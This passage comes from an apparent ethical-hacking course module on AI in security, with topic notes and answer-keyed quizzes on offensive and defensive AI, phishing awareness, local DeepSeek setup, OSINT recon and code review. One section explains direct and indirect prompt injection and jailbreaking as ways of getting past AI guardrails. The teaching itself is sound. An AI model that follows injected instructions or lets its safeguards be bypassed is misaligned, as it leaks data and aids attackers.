   - **Indirect prompt injection** ✓
   - Direct prompt injection
   - Jailbreaking exclusively
   - This is not a form of prompt injection at all
   > Indirect prompt injection is defined as instructions hidden in content the model is asked to analyse, as opposed to direct injection coming straight from the user's own prompt.
4. Which defence is most directly aimed at preventing prompt injection, per this module?
   - **Isolating user input from system instructions** ✓
   - Running the model on more powerful GPU hardware
   - Increasing the model's context window size
   - Disabling all model logging
   > Isolating user-supplied input from trusted system instructions (plus input validation/filtering) is the module's named defence against prompt injection.
5. Running DeepSeek locally via Ollama instead of using a cloud chatbot primarily addresses which concern from this module?
   - **Data privacy — no data leaves the machine** ✓
   - Faster internet speeds
   - Automatic vulnerability patching
   - Guaranteed higher model accuracy than any cloud model
   > The module frames local AI's main advantage as privacy: no data leaving your machine, comparable capability to cloud tools like ChatGPT/Copilot.
6. Which AI code-review tool is described as offering inline, in-editor suggestions as you type?
   - **GitHub Copilot** ✓
   - CodeQL
   - Semgrep
   - Nmap
   > GitHub Copilot is specifically described as providing inline suggestions/warnings, distinct from CodeQL's static analysis and Semgrep's customisable scanning.
7. An AI-generated recon script is technically correct but targets IP ranges outside the engagement's authorised scope. What should happen?
   - **The script must not be run until it's corrected to match the authorised scope, regardless of technical correctness** ✓
   - It should be run immediately since AI-generated code is presumed safe
   - Scope only matters for exploitation, not reconnaissance
   - The script should be run against the extra ranges since AI suggested it
   > The module stresses validating AI-suggested recon scripts against the authorised scope before running them — technical correctness never overrides authorization.
8. Which phishing type would best describe a fraudulent SMS message claiming to be from a bank?
   - **Smishing** ✓
   - Vishing
   - Whaling
   - Clone phishing
   > Smishing specifically refers to SMS-based phishing, distinct from vishing (voice/phone) or whaling (targeting executives).
9. What is the key ethical distinction this module draws between generating a phishing email for a training exercise versus sending it to real people?
   - **The training exercise is for awareness/annotation only; sending generated phishing content to real people outside an authorised, scoped engagement is out of bounds** ✓
   - There is no distinction; both are treated as equally acceptable
   - Sending it to real people is fine as long as AI generated the content
   - The distinction only applies to emails, not SMS or voice phishing
   > The module is explicit that the phishing-generation exercise is for awareness/training, and actually sending such content to real people outside an authorised engagement crosses an ethical/legal line.
10. Why does the module recommend reviewing every AI-suggested change to the M12 subdomain script line by line, even though AI sped up development?
   - **Because AI-generated code still needs human validation before being trusted to run, especially against live targets** ✓
   - Because line-by-line review is required by Python's syntax rules
   - Because the AI model cannot execute code itself under any circumstance
   - Because concurrency/threading code never contains bugs
   > Consistent with the module's broader theme, speed from AI assistance doesn't remove the need to understand and validate what the code actually does.

### Topics

#### 152. Basics of AI, ML, and Deep Learning in Security Context `[theory]` — Week 11

AI, ML, and Deep Learning are nested layers, not synonyms — AI is the broad goal (simulating human decisions with rules that can be manually defined), ML is a subset that learns patterns from data instead of hand-coded rules, and DL is a further subset using deeply layered neural networks that auto-discover features from very large datasets. Each layer trades more data and compute for less manual human involvement, and each is already embedded in everyday security products.

**Key Points:**

- AI: machines simulating human decision-making with logic/rules that are largely human-defined (e.g. a spam filter deciding a message looks suspicious); works on modest hardware and less data
- ML: trained on labelled or unlabelled data instead of explicit rules, and comes in three flavours - Supervised (learns from labelled data, e.g. spam vs. not-spam classification), Unsupervised (finds hidden patterns/clusters, e.g. grouping similar customers), and Reinforcement (learns via reward feedback, e.g. self-learning bots)
- DL: layered neural networks needing large datasets and real processing power (GPUs), auto-discovers features with minimal human tuning (e.g. detecting malware behaviourally, without line-by-line code review, or recognising images/audio)
- Real products already run this stack in security: Windows Defender/McAfee and Avast/Norton (AI/ML-based malware detection), Gmail's spam filter (ML-based phishing detection), firewalls and Intrusion Detection Systems (ML-based anomaly detection in network traffic), and User Behaviour Analytics tools (ML flagging unusual login/access patterns for insider threats)
- Human involvement drops as you go deeper: AI = high (rules manually defined), ML = medium (humans still choose features), DL = low (features learned automatically) - which is also why DL needs the most data and compute
- Security applications scale with the layer: AI -> smart firewalls and chatbots, ML -> phishing/brute-force/fraud detection, DL -> large-scale log analysis and zero-day/behavioural pattern detection
- Trade-off to remember: more capable models cost more (data, compute, money) and still aren't unbeatable - attackers can trick ML models with adversarial manipulation, and all of these systems need continuous refinement to keep up with new attack patterns
- The source material's AI vs ML vs DL comparison table sharpens the layer distinction with everyday example use cases: AI -> email spam filters and chatbots, ML -> fraud detection and recommendation systems, DL -> image recognition and advanced malware detection
- Speed, hardware, and complexity scale together with the layer: AI is fast and runs on basic machines with 'basic to moderate' complexity, ML is moderate speed and depends on model size, DL requires high processing power (GPUs) and is the most complex tier (deep/layered neural networks)

**Resources:**

- [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) _(link)_
- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [MITRE ATLAS](https://atlas.mitre.org/) _(link)_

**Quick Quiz:**

1. How do AI, ML, and Deep Learning relate to one another according to this topic?
   - **They are nested layers: AI is the broad goal of simulating decisions, ML is a subset that learns from labelled data, and DL is a further subset using layered neural networks** ✓
   - They are three unrelated, competing technologies with no overlap
   - ML is broader than AI, and DL is broader than both
   - AI, ML, and DL are simply different names for the same technique
   > The topic explicitly frames these as nested layers, not synonyms, with AI as the umbrella concept and ML/DL as increasingly specialized subsets.
2. Which example best illustrates a Machine Learning (not Deep Learning) security application from this topic?
   - **Learning from past attacks to flag future ones, such as phishing/brute-force detection** ✓
   - Detecting malware behaviourally without any line-by-line code review
   - A smart firewall making simple rule-based decisions
   - Auto-discovering features from raw log data using layered neural networks
   > ML is described as trained on labelled data to find patterns, exemplified by learning from historical attacks to flag phishing or brute-force attempts, distinct from DL's behavioural/auto-feature-discovery role.
3. What capability is specifically attributed to Deep Learning rather than basic ML in this topic?
   - **Auto-discovering features for behavioural malware detection without manual code review** ✓
   - Simulating human decision-making in general
   - Basic phishing filter rules
   - Manually labelling training data
   > DL's layered neural networks can auto-discover relevant features from large datasets, enabling behavioural detection of malware without needing manual, line-by-line analysis.

#### 153. Role of AI in Offensive & Defensive Cybersecurity `[theory]` — Week 11

AI is genuinely dual-use in security — the same underlying pattern-recognition techniques that detect anomalies for defenders can generate convincing attacks for adversaries. Real incidents already show both sides in action: attackers have used AI voice cloning to impersonate executives and cause six-figure fraudulent transfers, while defenders use AI-powered SIEM, honeypots, and automated response to catch and contain threats in seconds instead of hours.

**Key Points:**

- Offensive — AI-generated phishing and deepfakes: realistic fake emails, messages, and even cloned voices/videos impersonating executives; a real-world case saw a company lose $243,000 after attackers used AI voice cloning to impersonate a CEO and trick employees into wiring funds
- Offensive — OSINT-driven reconnaissance: AI scans social media and public sites (e.g. LinkedIn) to extract employee details for personalised spear-phishing targeting
- Offensive — AI-assisted password recovery: tools such as PassGAN use AI to predict and crack passwords faster than traditional brute-force methods
- Offensive — AI-evasive malware and automated exploit development: malware that dynamically reprograms itself to slip past antivirus, plus AI systems that scan for zero-day vulnerabilities and AI-enhanced botnets that scale up DDoS attacks
- Defensive — anomaly detection via ML + SIEM: flags behaviour that breaks a user's or system's normal pattern (e.g. a login from a new country, or a device uploading unusually large amounts of data late at night) instead of relying only on known-signature rules, which also reduces false positives and alert fatigue over time
- Defensive — AI-powered honeypots: decoy systems (fake login pages, file servers) that lure attackers in; AI makes the decoys more realistic, learns from attacker behaviour in real time, and can auto-trigger alerts or reroute connections without human input
- Defensive — automated incident response and fraud prevention: AI isolates an infected device automatically within seconds, and flags anomalous financial transactions (e.g. blocking a suspicious purchase that doesn't match usual spending)
- Defensive — AI-assisted vulnerability/code scanning: tools like GitHub Copilot flag insecure patterns (e.g. an unfiltered login form) as code is written
- Both offensive and defensive uses draw on the same core techniques — pattern recognition, anomaly detection, and automation — which is exactly why AI in cybersecurity is described as a double-edged sword
- The term 'honeypot' traces to a village trap for catching monkeys: a treat placed inside a narrow-necked jar lets the monkey's hand in but not out once it's grabbed the food — greed keeps it stuck long enough to be caught, the same lure-and-hold logic AI-powered honeypots use on attackers
- AI honeypots work through four capabilities: Learning Patterns (studying attacker actions to predict future behaviour), Smarter Detection (spotting unusual activity in real time, including new or unexpected attack types), Realistic Decoys (mimicking login pages, file servers, or web applications so attackers are more likely to fall for them), and Automated Response (triggering alerts, blocking connections, or rerouting attackers silently, without human input)
- Worked honeypot example from the source material: a fake email server is set up as a honeypot; a hacker finds it and tries to steal data; the honeypot lets this happen while logging everything the hacker does, and AI then analyses those logged steps and flags the behaviour as a new attack method — protecting other real systems from that technique going forward
- Four documented benefits of AI-powered honeypots: Early Detection (spotting threats before they cause real harm), Low False Alarms (AI filters out harmless traffic noise), Cost-Effective Protection (gathering high-quality threat intelligence without expensive real damage), and Strategic Advantage (the more attackers engage with the honeypot, the more the system learns and adapts)
- SIEM (Security Information and Event Management) is the tool that collects, stores, and analyses log data across an organisation's systems so security teams can monitor activity and identify potential threats in real time; combining SIEM with AI/ML anomaly detection is what lets defenders catch attacker methods that predefined, signature-based rules alone would miss
- Documented benefits of AI + SIEM integration: behavioural-based detection (catches unknown threats by behaviour, not signature), early warning (flags threats before damage occurs), reduced alert fatigue (filters harmless activity so teams focus only on real risks), real-time response (triggers immediate actions like blocking IPs or isolating affected systems), continuous learning (the more data it sees, the smarter it gets over time), scalability (works effectively even in large organisations with massive data volumes), data loss protection (detects abnormal data downloads/transfers), and cloud security monitoring (monitors vast cloud environments for threats in real time)
- Known challenges with ML-based anomaly detection/SIEM: it requires clean and relevant data to train the models, it can initially flag harmless activity until it fully learns what's normal, it must be regularly updated to handle new types of attacks, and attackers are also using AI themselves, which raises the stakes further
- Automated penetration testing is a named category in the source material, not just theory: AI tools like Deep Exploit automate pentesting and vulnerability assessment to reduce manual effort, while AI also helps ethical hackers analyse and report bugs faster ('enhanced bug hunting')
- AI-powered spam/phishing filters work by studying an email's structure, attachments, and hyperlinks rather than relying on a human reading every message, and can act as bots outside the mailbox to stop a phishing scam before it executes
- AI-powered firewalls block suspicious activity automatically without human intervention, and improve over time by learning from past attacks to predict and stop new ones
- AI-driven cyber threat intelligence gathers and analyses threat data to predict future attacks, including tracking known hacker groups and warning organisations before those groups strike
- Two forward-looking trends the source material flags for where this offensive/defensive balance is headed: predictive threat intelligence (analysing cyber trends to anticipate attacks before they happen) and 'AI vs AI cyber warfare' (AI-powered defence systems fighting AI-driven attacks)
- Because this field moves fast, staying current matters as much as the underlying concepts: follow research from sources like IEEE, MIT, IBM Security, and Abnormal Security; consider certifications such as MIT's 'Machine Learning for Cybersecurity' (Coursera), CEH, or OSCP; and engage with communities/events like the OWASP AI Security Group, Black Hat AI Track, DEF CON AI Village, and RSA Conference - demand for AI-savvy security specialists and cyber-risk consultants is explicitly called out as a growth area

**Resources:**

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [MITRE ATLAS](https://atlas.mitre.org/) _(link)_
- [Google Machine Learning Crash Course](https://developers.google.com/machine-learning/crash-course) _(link)_

**Quick Quiz:**

1. Which of these is described as an offensive use of AI in cybersecurity?
   - **AI-powered password recovery tools like PassGAN** ✓
   - Automated incident response that isolates infected devices
   - AI-powered spam/phishing filters
   - AI code-vulnerability scanning with tools like GitHub Copilot
   > PassGAN and AI-generated phishing/deepfakes are listed as offensive uses, while spam filters, automated IR, and code scanning are listed as defensive uses.
2. Which scenario best represents a defensive AI use case from this topic?
   - **Flagging a login attempt from an unusual new country as anomalous** ✓
   - Using AI to generate more convincing phishing emails
   - Using AI to automate OSINT-driven reconnaissance against a target
   - Using AI to evade malware detection
   > Anomaly detection, like flagging a login from an unexpected location, is explicitly listed as a defensive AI application.
3. Why is AI described as 'dual-use' in the context of cybersecurity?
   - **Because the same underlying AI techniques can be applied both to attack (phishing, evasive malware) and to defend (anomaly detection, filters)** ✓
   - Because AI can only be used defensively, never offensively
   - Because AI requires two separate models to function at all
   - Because AI in security always requires human oversight to work
   > The topic frames AI as genuinely dual-use: the same class of capability serves both attackers and defenders, just aimed at different goals.

#### 154. Ethical Boundaries in AI-Assisted Hacking `[theory]` — Week 11

AI's dual-use nature raises the same authorisation questions as any other tool in this course — just because AI can generate an attack script or a deepfake doesn't make it legal or ethical to run one. Real incidents (like AI voice-cloning fraud) show the stakes are not theoretical, which is why ethical-use principles and legal compliance matter as much as technical skill.

**Key Points:**

- Positive/ethical uses of AI in security: finding weaknesses before malicious actors do, detecting fraud and scams through behavioural analysis, blocking cyberattacks as they happen, testing password strength, and supporting law enforcement in identifying cybercriminals
- Negative/unethical uses: automating attacks at scale, generating convincing fake images/video/audio of real people, conducting unauthorised surveillance without consent, and rapidly spreading misinformation
- Four core ethical concerns: privacy violations (collecting PII without authorisation), lack of accountability (it's hard to assign responsibility for harm caused by an AI decision), bias and discrimination baked into training data, and weaponisation of AI capability into cyber weapons
- Ethical-use principles: follow applicable laws and regulations (e.g. GDPR fines can reach 20 million euros for data-protection violations in the EU; CCPA governs consumer data in California), obtain consent, be transparent about how AI decisions are made, actively check for and correct bias, and put measures in place to prevent misuse
- Real stakes: AI voice cloning has already been used to impersonate a CEO and cause a $243,000 fraudulent wire transfer - illustrating why 'it's just AI-generated' is not an ethical or legal defence
- Responsibilities of AI developers and security practitioners: build AI with security in mind, set clear internal policies against misuse, strengthen AI defences against AI-powered threats, and only use AI for penetration testing with explicit legal permission
- Concrete fairness example from the source material: AI-based fraud detection must not wrongly flag legitimate users as fraudulent because of biased algorithms - a direct, practical illustration of the 'bias and discrimination' concern rather than an abstract one
- Where this is heading: governments are expected to keep tightening AI-specific laws, companies are expected to adopt formal responsible-AI governance frameworks for fair and accountable security practices, and cybersecurity professionals will increasingly need dedicated ethical-AI-hacking training rather than picking the norms up ad hoc

**Resources:**

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [MITRE ATLAS](https://atlas.mitre.org/) _(link)_

**Quick Quiz:**

1. Which of the following is listed as a key ethical concern with AI in hacking contexts?
   - **Privacy violations from PII collection and lack of accountability** ✓
   - AI models running too slowly to be useful
   - AI being too expensive to license for security teams
   - AI requiring too much electricity to run locally
   > The topic lists privacy violations (PII collection), lack of accountability, bias/discrimination, and weaponisation of AI capability as the key concerns.
2. Which principle is explicitly named as part of ethical AI use in this topic?
   - **Obtaining consent and being transparent** ✓
   - Maximising the number of targets scanned per day
   - Avoiding all documentation of AI-assisted findings
   - Using AI only on production systems without authorization
   > The topic's ethical-use principles include following applicable laws, obtaining consent, being transparent, and preventing misuse.
3. According to this topic, does the mere fact that AI can generate an attack script make running it legal or ethical?
   - **No — authorization and ethical principles still apply regardless of what AI can technically generate** ✓
   - Yes — AI-generated content is automatically authorized for use
   - Yes, but only if the AI model is open-source
   - It depends solely on the AI vendor's terms of service
   > The topic draws a direct parallel to any other tool in the course: capability doesn't equal authorization, so the same legal/ethical boundaries still apply.

#### 155. Installing & Using Local AI (DeepSeek locally) `[setup]` — Week 11

Run DeepSeek R1 fully offline via Ollama — a local, open-source coding/reasoning model comparable to ChatGPT or GitHub Copilot but with no data leaving your machine. Ollama exists specifically because DeepSeek doesn't ship as a ready-to-run desktop app: it needs a backend to download, store, and run the model efficiently, and to hook it into tools like VS Code.

**Key Points:**

- DeepSeek R1 is a locally run, open-source AI model for code generation, debugging, and text analysis — functionally similar to ChatGPT/Copilot, but nothing is sent to a cloud server
- Ollama is the backend that makes local AI practical: it downloads and stores model files, optimises performance whether you're on CPU or GPU, and reduces installation to a single command
- System requirements: Windows 10/11, macOS, or Linux; minimum 16GB RAM (32GB recommended); 20-50GB free storage; GPU is optional but an NVIDIA CUDA-supported GPU accelerates inference
- Install flow: download Ollama from ollama.com/download for your OS, then run the model from a terminal/Command Prompt — this single command both downloads and starts DeepSeek locally
- Editor integration: installing the 'Continue' extension in VS Code auto-detects a locally running Ollama model, giving in-editor AI assistance without any cloud API key
- Why local matters specifically for security work: privacy (nothing leaves the machine, useful when handling sensitive engagement data), no vendor-imposed usage limits or censorship, works fully offline, and is free to run after initial setup versus a metered cloud subscription
- Trade-off to know: local AI needs decent hardware and real disk space/setup time up front — on constrained machines, a cloud tool is still faster to get running
- Local AI is also called Edge AI: rather than sending data to cloud hosting companies such as Google AI, OpenAI, or Amazon Web Services (AWS), the model runs almost entirely on the user's own device — a laptop, smartphone, or personal server
- Concrete privacy contrast: an AI tool that drafts emails in the cloud sends those drafts to a company's server for processing first; the same tool running as Local AI never sends the emails off the device at all
- Concrete control contrast: with cloud AI (e.g. ChatGPT online) the provider controls what the model can or cannot say and can limit access, track usage, or ban a user; a locally run model can be customised freely with no such restrictions, and it won't suddenly disappear if the provider shuts the cloud service down
- Concrete offline example from the source material: a journalist working in a restricted country can use Local AI to write reports and analyse data fully offline, keeping the work private with no dependency on an internet connection — the same offline resilience applies to security work done in the field or on air-gapped engagements
- Additional documented benefits of Local AI: no one else sees or stores your data, you don't have to trust a large company with private information, you reduce the risk of data breaches tied to a cloud provider, and responses are often faster since nothing round-trips to a remote server
- Beyond code generation, the source material documents ethical-hacking uses for a locally run DeepSeek model: script generation for recon (subdomain scanning, WHOIS/DNS lookups, calling passive information-gathering APIs), improving existing code (adding comments, fixing bugs/typos, adding exception handling or validation), secure coding practice (detecting insecure patterns like hardcoded passwords or SQL injection and suggesting alternatives, automating test functions for small tools), generating brute-force login-testing scripts legally (for red teams testing password strength on their own infrastructure), and automating security reports (organised Markdown/PDF reports, risk summaries, log-analysis summaries)
- Best practices for ethical use of a local model like DeepSeek, per the source material: use it only on authorised systems, log and document every test, never store or share malicious scripts it generates, validate all AI output manually before using it, and stay updated on AI-misuse detection techniques
- The source material is explicit about dual-use risk: DeepSeek 'has also raised serious concerns due to its potential misuse by threat actors' — without strict ethical discipline the same assistant that speeds up legitimate security research 'can easily cross the line into dangerous territory'

```bash
ollama run deepseek-coder:6.7b
ollama pull deepseek-coder:6.7b
```

**Resources:**

- [Ollama](https://ollama.com) _(tool)_
- [Ollama library: deepseek-coder](https://ollama.com/library/deepseek-coder) _(link)_

**Quick Quiz:**

1. What is the minimum RAM recommended to comfortably run DeepSeek R1 locally via Ollama, per this topic?
   - **16GB minimum, with 32GB recommended** ✓
   - 2GB minimum, with 4GB recommended
   - 128GB minimum, with 256GB recommended
   - No RAM requirement is listed since it always runs in the cloud
   > The topic specifies 16GB RAM minimum (32GB recommended) and 20-50GB of storage, with GPU acceleration being optional.
2. What is Ollama's role in this setup?
   - **It manages model download, resource optimisation, and integration for running the model locally** ✓
   - It is a cloud API that sends prompts to OpenAI's servers
   - It is a Python library for socket programming
   - It is a web browser extension for phishing detection
   > Ollama is the tool that handles pulling, running, and managing local AI models like deepseek-coder, abstracting away manual setup.
3. What does the VS Code 'Continue' extension do in relation to a locally running Ollama model?
   - **It auto-detects the local model and integrates it for in-editor AI assistance** ✓
   - It uploads your code to a public AI service for review
   - It replaces Ollama entirely with a cloud-hosted model
   - It is required to install Ollama in the first place
   > The Continue extension is described as auto-detecting a locally running Ollama model so it can be used directly inside the editor.

#### 156. AI-Powered Reconnaissance & OSINT Automation `[theory]` — Week 11

AI can accelerate reconnaissance by generating and adapting scripts on the fly, and by automating the collection and analysis of Open-Source Intelligence (OSINT) — publicly available information from social media, websites, news, and public databases that's already a normal part of both ethical-hacking recon and threat-intel work.

**Key Points:**

- OSINT is the process of collecting, analysing, and using publicly available information; AI improves it by automating data collection, filtering relevant signal from noise, and spotting patterns at a scale a human reading manually couldn't match
- Example OSINT tools referenced in the source material: Maltego (graph-based link analysis), Shodan (search engine for internet-connected devices), Google Dorking (advanced search operators for finding exposed data)
- NLP-driven analysis: large language models like GPT-4/BERT (accessible via tools such as Hugging Face Transformers) can summarise scraped reports, run sentiment analysis on social posts, and identify discussion themes — turning raw scraped text into a structured intelligence report
- Digital-footprint checks: tools like Have I Been Pwned check for leaked credentials, and the OSINT Framework aggregates many OSINT tools for footprint analysis — useful for mapping an organisation's exposed attack surface before an engagement
- Use case: ask a local/AI model to generate a starter script for a specific recon task (e.g. checking a candidate list of common subdomains against a target domain), then review and adapt what it produces rather than running it blind
- AI can also scan social media and public sites for personal information relevant to a spear-phishing risk assessment as part of a sanctioned engagement
- Always validate that any AI-suggested recon script or scraping target stays inside the authorised scope before running it — OSINT automation doesn't change the rules of engagement
- A locally run model such as DeepSeek can be asked directly to write reconnaissance scripts for three concrete task categories beyond subdomain checks: gathering WHOIS and DNS data on a target domain, and interacting with passive information-gathering APIs — the same category of recon task as the OSINT tooling above, but generated and refined interactively rather than run off-the-shelf

**Resources:**

- [OSINT Framework](https://osintframework.com/) _(link)_
- [Ollama](https://ollama.com) _(tool)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_

**Quick Quiz:**

1. What is a practical use case for AI in reconnaissance, according to this topic?
   - **Asking a local/AI model to generate a starter script for a specific recon task, then reviewing and adapting it** ✓
   - Letting AI autonomously attack any target it discovers without oversight
   - Using AI exclusively to write final pentest reports
   - Replacing Nmap entirely since AI can scan networks without any tooling
   > The topic frames AI recon assistance as generating a starting point that a human then reviews and adapts, not as fully autonomous scanning.
2. What must be checked before running an AI-suggested recon script, per this topic?
   - **That it's validated against the authorised scope of the engagement** ✓
   - That it was generated by a paid AI subscription rather than a free one
   - That it uses only the Python standard library
   - That it has been translated into a compiled binary
   > The topic explicitly warns to always validate AI-suggested recon scripts against the authorised scope before running them.
3. Besides scripting, what other recon task can AI assist with according to this topic?
   - **Scanning social media/public sites for personal info relevant to a spear-phishing risk assessment** ✓
   - Physically breaking into a target's office
   - Issuing legal subpoenas for target data
   - Bypassing multi-factor authentication automatically
   > The topic notes AI can help scan public sources for personal information relevant to assessing spear-phishing risk, a form of OSINT automation.

#### 157. AI for Phishing & Social Engineering (awareness exercise) `[theory]` — Week 11

AI makes phishing more convincing by fixing the spelling/grammar tells that used to be reliable red flags — this topic is an awareness exercise, not an invitation to phish real people. The source material includes a concrete example of what an AI-generated phishing email actually looks like, which is useful for training people to recognise the pattern rather than the old typo-based tells.

**Key Points:**

- Phishing taxonomy: Vishing (phone calls), Smishing (SMS with malicious links), Whaling (targets executives like CEOs/CFOs), Clone phishing (a real email copied with links/attachments swapped for malicious ones), Email phishing (fake brand impersonation - the most common type), Spear phishing (personalised attack using specific target details)
- Before AI, phishing emails were often full of spelling mistakes and odd grammar - an easy tell. AI tools (ChatGPT-style generators, deepfake tech, AI chatbots) now produce fluent, realistic, personalised scam text that removes those old red flags
- Concrete example from the source material: a fake '[ACTION REQUIRED] Security Alert' email from a spoofed sender (e.g. security@paypal-alert.com) claims an unauthorised login was detected and the account temporarily locked, pressuring the recipient to click a 'verify your identity' button within 24 hours or lose access permanently - combining urgency, brand authority, and a fear-based deadline
- A second illustrative example from the source material, showing the pattern generalises beyond one brand: a fake bank email alert claiming a password reset is required reads as fully legitimate precisely because it's AI-generated - the same fluency that sells the PayPal-style alert works for any impersonated brand
- AI also strengthens the recon side of social engineering: NLP-based scraping can analyse a target's online presence to tailor a pretext, and chatbot/voice-cloning tooling can simulate human-like conversation for vishing-style scams
- User protections: enable two-factor authentication everywhere, never click links in unsolicited 'urgent' emails, verify suspicious requests through a separate/known channel, and rely on AI-powered spam/phishing filters as a first line of defence
- This exercise is for awareness/training only - the goal is recognising manipulation techniques (urgency, authority, fear, fake branding), not producing phishing content to use outside an authorised, scoped engagement

**Resources:**

- [Have I Been Pwned](https://haveibeenpwned.com) _(tool)_
- [SANS Security Awareness Training](https://www.sans.org/for-organizations/workforce/security-awareness-training) _(link)_
- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_

**Quick Quiz:**

1. Which phishing type specifically targets executives, per the taxonomy in this topic?
   - **Whaling** ✓
   - Vishing
   - Smishing
   - Clone phishing
   > Whaling is the term specifically for phishing attacks targeting high-value executives, distinct from vishing (phone) and smishing (SMS).
2. Why does this topic say AI makes phishing more dangerous than older templated scams?
   - **It fixes the spelling/grammar tells that used to be reliable red flags, making messages read as more polished and personalised** ✓
   - It automatically bypasses all spam filters technically
   - It requires no target research at all
   - It only works over voice calls, not email
   > AI-generated phishing content is described as more polished and personalised, removing the poor grammar/spelling that used to help people spot scams.
3. Which user protection is explicitly recommended in this topic against AI-enhanced phishing?
   - **Enable 2FA everywhere and verify unsolicited urgent requests via a separate channel** ✓
   - Disable email entirely
   - Only use phone calls for all business communication
   - Trust any message that uses correct grammar and spelling
   > The topic recommends 2FA, avoiding links in unsolicited urgent emails, and verifying via a separate channel as concrete protections.

#### 158. Bypassing AI Ethical Limits via Prompt Injection `[theory]` — Week 11

Prompt injection is the technique of crafting input that overrides an AI system's intended constraints or instructions, causing it to behave outside the limits it was designed to respect. It comes in a few distinct forms with real downstream risks — from data leakage to AI-assisted cybercrime — and defending against it requires the same discipline as defending any other system input.

**Key Points:**

- Direct prompt injection: the attacker's prompt itself overrides the model's normal behaviour or guardrails
- Indirect prompt injection: malicious instructions are embedded in content the LLM is asked to analyse — a webpage or document it's asked to summarise — causing it to act on the attacker's hidden instructions instead of the user's request
- Jailbreaking: exploiting vulnerabilities in the model specifically to bypass its safety guardrails and produce output that violates its intended purpose
- Data breach risk: a manipulated AI may leak sensitive data such as passwords, financial information, or business secrets that it had access to
- Misinformation risk: attackers can manipulate AI to spread false narratives and bypass fact-checking measures, amplifying fake news
- AI-assisted cybercrime risk: tricking an AI model into generating phishing emails, malware code, or attack strategies lowers the skill bar for less experienced attackers
- Defences: strict input validation/filtering to reject manipulative prompts, context isolation (keeping user input separate from system-level instructions and unrestricted external sources), ongoing monitoring of AI interactions for signs of manipulation, and user education so non-technical staff recognise manipulated AI output
- This sits inside the same dual-use pattern as the rest of the module — the technique a researcher uses to test an AI system's guardrails is the same one an attacker uses to break them, so authorisation and scope matter here as much as with any other tool in this course

**Resources:**

- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_
- [Simon Willison: Prompt Injection series](https://simonwillison.net/series/prompt-injection/) _(link)_
- [MITRE ATLAS](https://atlas.mitre.org/) _(link)_

**Quick Quiz:**

1. What is the difference between direct and indirect prompt injection?
   - **Direct injection is the attacker's own prompt overriding the model's behaviour; indirect injection embeds malicious instructions in content the LLM is asked to analyse** ✓
   - Direct injection only works on local models; indirect injection only works on cloud models
   - Indirect injection requires physical access to the server running the model
   - There is no meaningful difference between the two
   > Direct injection comes straight from the user's own prompt, while indirect injection hides instructions inside external content (a webpage, document) that the model later processes.
2. How does this topic define 'jailbreaking' in relation to prompt injection?
   - **Exploiting model vulnerabilities specifically to bypass safety guardrails** ✓
   - The standard, sanctioned process for fine-tuning a model
   - A defensive technique for filtering malicious input
   - A method for encrypting prompts before sending them
   > Jailbreaking is described as a distinct technique from general prompt injection, focused specifically on defeating a model's built-in safety restrictions.
3. Which of these is listed as a defence against prompt injection?
   - **Isolating user input from system instructions and applying strict input validation/filtering** ✓
   - Allowing any embedded webpage content to be treated as trusted system instructions
   - Disabling all logging and monitoring of model interactions
   - Giving every user prompt the same privilege level as system instructions
   > The topic lists strict input validation/filtering, isolating user input from system instructions, and ongoing monitoring as defences.

#### 159. Identifying Code Vulnerabilities Using AI (ChatGPT, GitHub Copilot) `[theory]` — Week 11

AI code-review tools can flag common vulnerability patterns faster and more consistently than manual review alone by learning from large sets of secure vs. insecure code — a useful second pair of eyes, not a replacement for understanding the code.

**Key Points:**

- Common vulnerabilities AI tools flag well: SQL Injection (manipulated database queries), Cross-Site Scripting/XSS (injected malicious scripts), Buffer Overflow (exceeding memory limits to crash or control software), and hardcoded passwords stored directly in code
- How AI actually finds these: models are trained on large collections of secure and insecure code, so they learn to recognise risky patterns, highlight where mistakes commonly happen, and suggest corrections in real time
- Tools and what each does: GitHub Copilot (inline suggestions and warnings about bad practices), CodeQL (static analysis that matches code against known vulnerability patterns), Semgrep (lightweight, customisable rule-based scanning), ChatGPT/LLMs (explain and review code conversationally)
- Real-world example: a developer builds a login form without properly filtering user input; an AI scanning tool recognises the missing validation and suggests proper input-sanitisation techniques before an attacker could exploit it
- Why it makes a difference at scale: AI reviews code far faster than a human, covers entire projects rather than just the files a reviewer happens to open, and applies the same security rules consistently every time — useful both as a production safety net and as a learning tool for developers new to secure coding
- Limitation to keep in mind: AI-flagged issues still need a human to confirm the fix is correct for the context — it's a second pair of eyes, not a replacement for understanding the vulnerability
- GitHub's own research, cited in the source material, reports that AI tools like Copilot and CodeQL have helped prevent a large number of security issues before they ever reached end users — evidence this catches real vulnerabilities at scale, not just in theory
- AI is expected to shift secure coding earlier in the lifecycle: more development teams are incorporating it specifically to patch vulnerabilities early, write safer code from the beginning, and reduce the cost and time needed for manual code reviews, rather than only catching issues after the fact

**Resources:**

- [GitHub Copilot](https://github.com/features/copilot) _(tool)_
- [CodeQL](https://codeql.github.com) _(tool)_
- [Semgrep](https://semgrep.dev) _(tool)_

**Quick Quiz:**

1. Which vulnerability classes does this topic say AI code-review tools flag well?
   - **SQL Injection, XSS, buffer overflows, and hardcoded passwords** ✓
   - Only hardware-level side-channel attacks
   - Only vulnerabilities in compiled C++ binaries
   - Only issues in cloud infrastructure configuration
   > The topic explicitly lists SQL Injection, XSS, buffer overflows, and hardcoded passwords as vulnerability patterns AI tools flag well.
2. Which tool is named specifically for customisable static-analysis scanning, alongside CodeQL and Copilot?
   - **Semgrep** ✓
   - Wireshark
   - Hydra
   - Hashcat
   > Semgrep is named as a customisable scanning tool, alongside GitHub Copilot for inline suggestions and CodeQL for static analysis.
3. How does this topic frame the proper role of AI in code security review?
   - **As a useful second pair of eyes, not a replacement for actually understanding the code** ✓
   - As a complete replacement for manual security review going forward
   - As only useful for generating documentation, never for finding bugs
   - As a tool that should be the sole reviewer with no human sign-off
   > The topic is explicit that AI review tools speed things up and add consistency but do not replace the need to actually understand the code.

#### 160. Lab: AI-assisted subdomain enumeration script `[lab]` — Week 11

